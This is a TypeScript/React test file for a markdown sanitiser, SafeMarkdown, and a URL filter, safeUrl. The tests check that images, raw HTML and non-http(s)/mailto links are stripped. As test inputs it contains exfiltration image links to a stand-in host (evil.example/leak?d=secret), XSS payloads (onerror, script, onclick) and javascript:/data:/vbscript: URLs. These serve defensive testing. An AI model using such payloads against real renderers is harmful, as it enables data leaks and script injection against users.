import { render } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import { SafeMarkdown, safeUrl } from './SafeMarkdown';

describe('SafeMarkdown', () => {
  it('renders ordinary markdown', () => {
    const { container } = render(<SafeMarkdown>{'**Bold** and _soft_.\n\n- one\n- two'}</SafeMarkdown>);
    expect(container.querySelector('strong')?.textContent).toBe('Bold');
    expect(container.querySelectorAll('li')).toHaveLength(2);
  });

  it('never renders images (no exfiltration via image URLs)', () => {
    const { container } = render(
      <SafeMarkdown>{'Look ![x](https://evil.example/leak?d=secret) here\n\n![ref][1]\n\n[1]: https://evil.example/p.png'}</SafeMarkdown>,
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).not.toContain('evil.example');
  });

  it('skips raw HTML', () => {
    const { container } = render(
      <SafeMarkdown>{'Hi <img src=x onerror="alert(1)"> <script>alert(1)</script><b onclick="x()">b</b>'}</SafeMarkdown>,
    );
    expect(container.querySelector('img, script, b')).toBeNull();
    expect(container.innerHTML).not.toMatch(/onerror|onclick|<script/);
  });

  it('allows only http(s) and mailto links, opened safely', () => {
    const { container } = render(
      <SafeMarkdown>
        {'[ok](https://example.com/a) [mail](mailto:hi@example.com) [bad](javascript:alert(1)) [data](data:text/html,x) [rel](/app/settings)'}
      </SafeMarkdown>,
    );
    const links = Array.from(container.querySelectorAll('a'));
    expect(links.map((a) => a.getAttribute('href'))).toEqual(['https://example.com/a', 'mailto:hi@example.com']);
    for (const a of links) {
      expect(a.getAttribute('rel')).toBe('noreferrer noopener');
      expect(a.getAttribute('target')).toBe('_blank');
    }
    expect(container.textContent).toContain('bad');
    expect(container.innerHTML).not.toContain('javascript:');
  });

  it('with allowLink, renders rejected links (inline, reference, autolink) as plain text', () => {
    const allowLink = (href: string) => href.startsWith('https://solace.invalid/cite/');
    const { container } = render(
      <SafeMarkdown allowLink={allowLink}>
        {'Source [1](https://solace.invalid/cite/1). [Click here](https://evil.example/?q=secret) ' +
          '[ref][x] <https://evil.example/auto>\n\n[x]: https://evil.example/ref'}
      </SafeMarkdown>,
    );
    const links = Array.from(container.querySelectorAll('a'));
    expect(links.map((a) => a.getAttribute('href'))).toEqual(['https://solace.invalid/cite/1']);
    expect(container.innerHTML).not.toContain('evil.example/?q');
    expect(container.textContent).toContain('Click here');
    expect(container.textContent).toContain('ref');
  });
});

describe('safeUrl', () => {
  it.each([
    ['https://example.com', 'https://example.com/'],
    ['HTTP://example.com/x', 'http://example.com/x'],
    ['mailto:a@b.co', 'mailto:a@b.co'],
    ['  javascript:alert(1)', undefined],
    ['JaVaScRiPt:alert(1)', undefined],
    ['data:text/html;base64,xx', undefined],
    ['//evil.example', undefined],
    ['/relative', undefined],
    ['vbscript:x', undefined],
  ])('%s → %s', (input, expected) => {
    expect(safeUrl(input)).toBe(expected);
  });
});
